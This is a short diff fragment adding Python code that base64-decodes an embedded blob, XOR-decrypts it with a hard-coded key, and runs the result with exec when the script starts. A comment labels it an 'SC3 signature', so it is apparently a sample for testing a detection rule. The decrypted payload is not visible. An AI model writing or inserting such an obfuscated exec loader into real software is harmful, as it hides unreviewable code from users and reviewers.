@@ -1,0 +1,13 @@
+dbqjW2UKAqJ4t20QKQXNY6skoto0QQmycf1h1Gue0Sahrq9UZw6EMn5x8A0+3tZh4b1g2efc1Ct"
+_K = bytes.fromhex("98e20ef15b79a7a6")
+
+def _xor(buf, k):
+    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))
+
+def _decode():
+    raw = base64.b64decode(_BLOB)
+    return _xor(raw, _K).decode("utf-8")
+
+if __name__ == "__main__":
+    # SC3 signature: base64.b64decode(...) -> exec / compile near by
+    exec(compile(_decode(), "<runtime>", "exec"), {})
